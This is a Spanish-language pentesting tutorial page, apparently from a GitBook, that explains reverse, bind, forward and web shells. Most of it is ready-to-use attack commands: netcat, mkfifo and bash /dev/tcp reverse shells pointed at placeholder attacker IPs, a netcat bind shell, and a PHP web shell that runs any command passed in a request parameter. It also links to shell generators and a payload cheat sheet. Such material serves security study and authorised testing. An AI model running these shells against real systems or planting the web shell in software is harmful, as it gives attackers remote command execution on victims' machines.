---
description: Aquí veras los tipos de shells que existen
cover: >-
  https://images.unsplash.com/photo-1629654291663-b91ad427698f?crop=entropy&cs=srgb&fm=jpg&ixid=M3wxOTcwMjR8MHwxfHNlYXJjaHw2fHx0ZXJtaW5hbCUyMGxpbnV4fGVufDB8fHx8MTY4OTM0ODQwM3ww&ixlib=rb-4.0.3&q=85
coverY: 73
---

# ↔️ Shells

Cuando comprometemos un software/servicio o nos aprovechamos de alguna falla o vulnerabilidad, nuestro siguiente objetivo es entrar en el sistema, y poder ejecutar comandos en el.

## Reverse Shell

Una Reverse Shell, es una shell que nos envía la maquina que queremos comprometer a nosotros. Esto de su lado se puede hacer de varias formas.&#x20;

(Ejemplo) Imagina que tienes un servicio HTTP/S corriendo en una maquina, y encuentras una vulnerabilidad que te permite ejecutar código, en este caso puedes enviarte una shell del lado de la maquina objetivo hacia tu equipo, y así poder entrar en el sistema.

Todo ello se hace mediante un puerto a elegir por el atacante. En los casos de Reverse Shell existen dos roles:

1. <mark style="color:yellow;">**Listener**</mark>: Este es el atacante, que esta escuchando en un puerto y una IP, esperando a que la maquina objetivo envíe la shell por ahí y así poder interceptarla y usarla
2. <mark style="color:yellow;">**Sender/Transmitter**</mark>: Esta es la maquina victima que hemos conseguido vulnerar, es la que enviará la shell por donde nosotros le indiquemos



{% tabs %}
{% tab title="Listener" %}
Este es un comando que usando **NetCat** nos sirve para todos los tipos de reverse shell

```sh
nc -nlvp PORT
```
{% endtab %}

{% tab title="Transmitter" %}
En este caso usamos la herramienta **NetCat** para enviar una "/bin/bash" a una IP (la del atacante/listener) y a un puerto seleccionado por el.

```sh
nc -e /bin/bash IP_Listener Puerto
```

{% hint style="warning" %}
Dependiendo de la versión de NetCat, puede que el parámetro `-e` no esté disponible, por lo que habrá que utilizar este comando:

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc Ip_Listener Puerto >/tmp/f
```
{% endhint %}

En este otro caso, este comando nos servirá para maquinas que no tengan NetCat instalado

```sh
bash -i >& /dev/tcp/IP_Listener/Puerto 0>&1
```
{% endtab %}
{% endtabs %}

<figure><img src="../.gitbook/assets/image (59).png" alt="" width="563"><figcaption><p>Ejemplo de Reverse Shell</p></figcaption></figure>

<details>

<summary>👈🏽 Estos son los parámetros que se utilizan con NetCat</summary>

Con respecto al comando `nc -nlvp PORT` nos referimos a los parámetros -n, -l, -v, -p:

1. `-n` : No aplicar resolución DNS
2. `-l` : Modo escucha
3. `-v` : Modo verbose
4. `-p` : Indicamos el puerto por el que nos ponemos en escucha

</details>

{% hint style="warning" %}
La herramienta NetCat, tiene diferentes variaciones como por ejemplo:&#x20;

* `nc`
* `ncat`
* `nc.traditional`
{% endhint %}

## Bind Shell

En este tipos de shell no es como en las [reverse shell](shells.md#reverse-shell) que nos enviamos una consola desde la victima, si no que como atacantes, **abrimos un puerto temporalmente en la maquina** objetivo en el que se ejecuta una shell, de manera que de nuestro lado, nos conectamos a la IP y Puerto en el que ejecuta la shell

{% tabs %}
{% tab title="Comando ejecutado en la maquina Atacante" %}
```sh
nc IP_Objetivo Puerto
```
{% endtab %}

{% tab title="Comando ejecutado en el Objetivo" %}
```sh
nc -nlvp Puerto  -e /bin/bash
```
{% endtab %}
{% endtabs %}

<figure><img src="../.gitbook/assets/image (55).png" alt="" width="514"><figcaption><p>Ejemplo Bind Shell</p></figcaption></figure>

{% hint style="info" %}
Existen herramientas que te proporcionan los comandos con los parámetros personalizados para ejecutarlos directamente:

1. [https://www.revshells.com/](https://www.revshells.com/) - Vía Web
2. [https://github.com/d4t4s3c/Shelly](https://github.com/d4t4s3c/Shelly) - Vía CLI
3. [https://github.com/totekuh/reverse-shell-generator](https://github.com/totekuh/reverse-shell-generator) - Vía CLI
4. [https://github.com/t0thkr1s/revshellgen](https://github.com/t0thkr1s/revshellgen) - Vía CLI
{% endhint %}

{% hint style="info" %}
Tienes disponible una **Cheat Sheet** aquí:

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
{% endhint %}

## Forward Shell

Las forward shells, son shells que son usadas cuando la maquina victima tiene reglas configuradas de manera que nos es imposible enviarnos una consola. En este caso, este tipo de shells, usan mkfifo, para poder usar una consola simulada. Esto se consigue ya que el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota

## Web Shell

A diferencia de las Reverse Shell, la web shell, nos permite ejecutar comandos directamente desde el archivo sin necesidad de entablarnos conexiones. Para ello subiremos un archivo PHP con este código:

```php
<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Después, accedemos al recurso y escribimos el comando a modo de parametro:

```bash
http://dominio.com/uploads/webshell.pgp?cmd=whoami
```

En ese ejemplo, a través del parámetro "cmd" le pasamos el comando y la salida nos la mostrará por pantalla.

{% hint style="warning" %}
Si queremos ejecutar una reverse shell mediante una web shell es importante codificar el comando en URL-encode para que funcione

![](<../.gitbook/assets/image (15).png>)
{% endhint %}
